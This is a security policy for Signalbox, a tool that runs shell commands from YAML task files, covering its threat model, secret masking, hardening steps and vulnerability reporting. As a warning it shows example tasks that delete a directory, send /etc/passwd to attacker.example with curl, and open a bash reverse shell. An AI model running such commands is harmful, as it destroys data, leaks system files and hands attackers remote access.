# Security Policy

## Supported Versions

| Version | Supported |
| ------- | --------- |
| 0.1.x   | Yes       |

## Security Model

Signalbox runs the shell commands in your YAML configuration files. It uses the Python `subprocess` module with `shell=True`. Thus, you can use these shell features:

- **Pipes and redirection**: `command1 | command2`, `output > file`
- **Command chaining**: `cmd1 && cmd2`, `cmd1 || cmd2`
- **Environment variables**: `$HOME`, `${VAR}`
- **Scripts with more than one line**: loops and conditions
- **Shell built-in commands**: for example, `cd` and `export`

These features have important security risks. Signalbox treats each configuration file as a shell script.

## Threat Model

### What Signalbox Protects Against

- **Unsafe YAML loading**: signalbox loads YAML only with `yaml.safe_load()`. A YAML file cannot make Python objects.
- **Directory traversal**: task names and group names can have only letters, digits, `_`, `-` and `.`. A name cannot start with `.` or `-`, and it cannot have `/`. Thus, a name cannot move a log path, an alert path or an export path out of its directory.
- **Tasks that do not stop**: each task has a time limit (300 seconds by default). When the time is over, signalbox stops the task and all the processes that it started: first with SIGTERM, then with SIGKILL.
- **Tasks that wait for input**: commands get no input (stdin is `/dev/null`). A command that asks for input stops with an error immediately. It does not wait until the time limit.
- **Full disks**: each log file has a maximum size (5 MB by default), and signalbox deletes old logs. **Caution:** this limit does not limit memory. Signalbox keeps all the output in memory while the task runs.
- **Unauthorized log access**: signalbox makes log files with the permissions `0o600`. `signalbox init` sets the permissions of the signalbox home and of `logs/` to `0o700`.
- **Accidental runs of the example tasks**: signalbox loads the example catalog only when `include_catalog` is exactly `true`. One example task deletes files. Thus, a value such as `"false"` (text, not a boolean) does not load the catalog.
- **Damage from runs at the same time**: file locks protect log rotation, the alert history and the run status when two runs change them at the same time.
- **Injection into exported schedule files**: refer to "Built-in Security Mitigations" below.

### What Signalbox Does Not Protect Against

- **Malicious YAML configuration files**: signalbox trusts all configuration files.
- **Privilege escalation**: signalbox runs with the permissions of the user.
- **Network attacks**: signalbox does not isolate scripts from the network.
- **Supply chain attacks**: signalbox trusts system commands, for example `curl` and `jq`.
- **Other users who can write to the signalbox home**: they can change the tasks. They can also turn off the notifications in `runtime/tray_state.json`, and you get no warning. Keep the signalbox home private (`0o700`).

## Important Security Requirements

### YAML Configuration Files Must Be Trusted

**Signalbox has no sandbox, and it does not examine commands.** It runs each command in a YAML file with all the permissions of the user who starts signalbox.

These are examples of dangerous commands:
```yaml
tasks:
  - name: dangerous_deletion
    command: rm -rf /important/directory
    description: This deletes the directory

  - name: data_exfiltration
    command: curl https://attacker.example/steal?data=$(cat /etc/passwd)
    description: This sends private data to a remote server

  - name: reverse_shell
    command: bash -i >& /dev/tcp/attacker.example/4444 0>&1
    description: This opens a backdoor
```

### Keep Secrets Out of Commands

Signalbox writes the command at the start of each log file (the `Command:` line). If the `command` field has a secret (for example, a token or a password), each log of that task has the secret. The log files have the permissions `0o600`. But other tools, for example backup or sync tools, can copy them.

Put secrets in an `env_file`, not in the command:

```yaml
tasks:
  - name: upload
    description: Upload the report
    command: 'curl -H "Authorization: Bearer $API_TOKEN" https://api.example/upload'
    env_file: secrets/upload.env   # API_TOKEN=..., chmod 600
```

The command has only the name `$API_TOKEN`. The shell gets the value when the task runs.

Signalbox also masks secret values in the logs. It replaces them with `*****` in the command, in stdout and in stderr. It masks these variables:
- The variables of the task (from `env_file` or `env`) whose names have `TOKEN`, `SECRET`, `PASS`, `KEY`, `AUTH`, `CREDENTIAL` or `SIGNATURE`.
- The variables in the `mask` list of the task.

Masking has limits:
- Signalbox masks only exact copies of a value. It does not find a value that the task changes, for example to base64 or URL encoding.
- Signalbox does not mask values that are shorter than 4 characters.
- Alert patterns still compare with the real output. An alert records only its pattern and its message, not the output.

Other steps:
- Make each `env_file` readable only by you (`chmod 600`). `signalbox config check-permissions` shows a warning for an `env_file` that other users can read.
- To keep the command out of the logs completely, set `logging.include_command: false` in `signalbox.yaml`.

### Security Best Practices

#### 1. Protect the Configuration Files

`signalbox init` makes the signalbox home and `logs/` private (`0o700`). If you made the files in a different way, set the permissions yourself:

```bash
chmod 700 ~/.config/signalbox/
chmod 600 ~/.config/signalbox/config/*.yaml
chmod 600 ~/.config/signalbox/config/tasks/*.yaml ~/.config/signalbox/config/groups/*.yaml

# Examine each file and directory that decides which commands run
signalbox config check-permissions
```

#### 2. Use Version Control

```bash
# Record all configuration changes
cd ~/.config/signalbox
git init
git add config/
git commit -m "Initial signalbox configuration"

# Examine all changes before you use them
git diff HEAD config/
```

#### 3. Examine Configuration Changes

- Do not copy YAML files from sources that you do not trust.
- Read each `command:` field before you add it to your configuration.
- For team configurations, examine each change in a pull request.

#### 4. Use the Minimum Privileges

Run signalbox as a user that has only the permissions that the tasks need:

```bash
sudo useradd -m -s /bin/bash signalbox-runner
sudo -u signalbox-runner signalbox group run monitoring
```

If a task must use `sudo`, let it run only one script that you examined:

```yaml
tasks:
  - name: update_packages
    command: sudo /usr/local/bin/safe-update.sh
    description: Run the approved update script
```

#### 5. Validate the Configuration Before You Use It

```bash
# Find configuration errors
signalbox validate

# Show each task and group, with its source file
signalbox task list
signalbox group list

# Show the global settings
signalbox config show
```

#### 6. Monitor the Runs

```bash
# Examine the logs for unusual behavior
signalbox log show task-name
signalbox log history task-name
signalbox log list --failed

# Follow the new runs of a task
signalbox log tail task-name

# Show failures and groups that did not run when they were due
signalbox status
```

#### 7. Keep Commands Simple

Put complex logic in a separate script file:

```yaml
# Better: run a script that you examined
tasks:
  - name: backup_database
    command: /usr/local/bin/backup-db.sh
    description: Run the approved backup script

# Avoid: complex commands in the YAML file
tasks:
  - name: backup_database
    command: |
      for db in $(mysql -e 'show databases' | tail -n+2); do
        mysqldump $db > /backups/$db-$(date +%Y%m%d).sql
      done
    description: Complex inline shell code
```

## Known Limitations

### Shell Injection Is Not Prevented

Signalbox does not have a command sandbox or an allowlist. This is intentional, for these reasons:

1. **Flexibility**: automation tasks use all the features of the shell.
2. **Compatibility**: limits on commands stop scripts that work now.
3. **Trust model**: signalbox treats configuration files as code, as Docker and make treat Dockerfiles and Makefiles.
4. **False security**: it is easy to go around a denylist or an allowlist. These lists can make users think that they are safe when they are not.

### Mitigation: Configuration as Code

Apply the same security rules to YAML configuration files as to source code:
- **Examine** all changes.
- **Test** in an isolated environment.
- **Audit** the configuration regularly.
- **Limit** write access.

## Reporting Vulnerabilities

### Scope

We accept security reports about these items:
- Vulnerabilities in the signalbox code, for example in configuration loading or in log files
- Bugs that can cause signalbox to run a command that the user did not configure
- Permission problems or isolation problems in signalbox

We do not accept reports about these items:
- "Signalbox runs the commands in the YAML files". This is the design.
- Vulnerabilities in scripts that users write
- Problems in third-party commands that scripts use

### How to Report

For security issues in the signalbox code:
- Use GitHub private vulnerability reporting. Go to the **Security** tab of
  [pdbeard/signalbox](https://github.com/pdbeard/signalbox/security), then click **Report a vulnerability**.
- Do not open a public issue for a security problem.

### Disclosure Policy

- We try to tell you that we received the report in a few days.
- We try to send a first assessment in 14 days or less.
- We agree the disclosure date with you.
- We disclose the problem after a fix is available, usually in 30 to 90 days.

## Security Checklist for Deployment

Before you use signalbox in production, do these steps:

- [ ] Keep the configuration files in version control.
- [ ] Run `signalbox config check-permissions`, and correct each problem that it shows.
- [ ] Keep secrets out of the `command` fields: use `env_file`, with the permissions 0o600.
- [ ] Examine each configuration change before you use it.
- [ ] Run signalbox as a user with the minimum privileges.
- [ ] Make sure that no task uses `timeout: 0`, and that `execution.default_timeout` is not 0, unless a task must run without a time limit.
- [ ] Set a maximum log file size, to prevent a full disk.
- [ ] Monitor the logs, and run `signalbox status` regularly (or use the tray).
- [ ] Schedule regular audits.
- [ ] Write an incident response plan.
- [ ] Keep the test environment separate from production.
- [ ] Make a backup plan.

## Built-in Security Mitigations

### 1. Time Limits

**Problem:** a command that does not stop can stop its group from continuing.
**Mitigation:** each task has the time limit `execution.default_timeout` (300 seconds), or its own `timeout`. When the time is over, signalbox stops the task and all the processes that it started (the process group). Signalbox does the same when you push Ctrl+C. First, it sends SIGTERM, so the task can clean up. After `execution.stop_grace_seconds` (5 seconds by default), it sends SIGKILL to the processes that did not stop.

```yaml
execution:
  default_timeout: 300    # Applies to each task that does not have its own timeout
  min_timeout: 1          # The smallest time limit (except 0)
  stop_grace_seconds: 5   # Time between SIGTERM and SIGKILL (0 = SIGKILL at once)
```

`min_timeout` only increases a very small limit, for example 0.1 seconds, to this value. It does not stop a task that never stops. A value of 0 removes the time limit: `timeout: 0` for one task, or `execution.default_timeout: 0` for all the tasks that do not have their own `timeout`. Examine each task that has no time limit.

### 2. Protection Against Full Disks

**Problem:** a large script output can fill the disk.
**Mitigation:** each log file has a maximum size. Signalbox removes the middle of output that is too large, and adds a marker.

```yaml
logging:
  max_file_size_mb: 5  # Removes output that is more than this size
```

### 3. Log File Access Control

**Problem:** log files can have private command output.
**Mitigation:** signalbox makes log files with the permissions `0o600`. Only the owner can read and write them.

```bash
ls -l ~/.config/signalbox/logs/*/
# Output: -rw------- (only the owner can read and write)
```

### 4. Safe Runs at the Same Time

**Problem:** two runs that change the same files at the same time can damage them.
**Mitigation:**
- Log rotation uses a file lock (`fcntl.flock()`). If the lock is not available, signalbox does not wait and does not delete old logs in that run. Thus, deadlocks cannot occur. If signalbox cannot delete old logs, the task result does not change.
- The alert history and the run status also use file locks. Signalbox writes the run status to a temporary file and then renames it. Thus, the tray never reads a file that is only partly written.

### 5. Safe Schedule Exports

**Problem:** a group name, a path or a description can change the meaning of an exported cron line or systemd unit.
**Mitigation:**
- Signalbox exports only groups with valid names and valid cron schedules.
- Signalbox puts the paths in shell quotes.
- Signalbox writes each description on one line. Thus, a description cannot add a systemd setting or a cron line.
- A system unit (`export-systemd` without `--user`) has `User=<you>`. Thus, the tasks run as your user, never as root.
- `export-cron --install` changes only the crontab line of that group and signalbox home. Your other cron jobs do not change. If signalbox cannot read your crontab, it does not write it.

### 6. Safe Notifications

**Problem:** the text of a notification can have quotes or shell characters.
**Mitigation:** on Linux, signalbox gives the text to `notify-send` as arguments, not through a shell. On macOS, signalbox escapes the text before it gives it to `osascript`.

## Comparison to Similar Tools

| Tool | How it runs commands | Isolation | Security model |
|------|----------------------|-----------|----------------|
| **Signalbox** | Shell (`sh -c`) | None | Trust the configuration files |
| **cron** | Shell (`sh -c`) | None | Trust the crontab entries |
| **systemd** | Runs the program directly, without a shell | Optional, strong (for example `ProtectSystem=`, `PrivateTmp=`) | Trust the unit files |
| **Ansible** | Modules; the `shell` module uses a shell | None for commands | Trust the playbooks |
| **Jenkins** | Shell steps | Pipeline code only (Groovy sandbox); shell steps have no isolation | Trust the Jenkinsfiles |
| **Docker** | Command in a container | Container isolation | Trust the images and Dockerfiles |

**Summary:** usually, configuration-as-code tools trust their configuration. Signalbox does the same.

## Future Considerations

We do not plan these security features now. We can add them in a later version:

- **An optional allowlist for commands**, with clear documentation of its limits
- **Signatures for configuration files**, and a check of these signatures
- **A record of all commands that cannot be changed.** Now, each log starts with its command (`Command:`), but signalbox rotates logs, and a user can delete them.
- **SELinux or AppArmor isolation for processes**
- **A dry-run mode that shows what will change before signalbox runs it**

If we add these features, they will be optional. Thus, current configurations will continue to work.

---

**Last Updated:** November 17, 2026
**Version:** 0.1.0
